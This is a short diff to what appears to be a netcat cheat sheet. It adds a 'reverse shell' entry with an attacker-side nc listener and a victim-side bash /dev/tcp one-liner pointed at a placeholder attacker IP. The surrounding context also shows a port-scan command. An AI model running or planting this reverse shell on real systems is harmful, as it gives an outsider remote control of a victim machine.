@@ -48,3 +48,9 @@ $ echo -n "foo" | nc -u -w1 127.0.0.1 5000
 
 * port scan
     $ nc -vz 192.168.0.117 1-100
+
+* reverse shell
+    * attacker
+        $ nc -n -vv -l -p 8787
+    * victim
+        $ /bin/bash -i > /dev/tcp/<attacker_ip>/8787 0<&1 2>&1
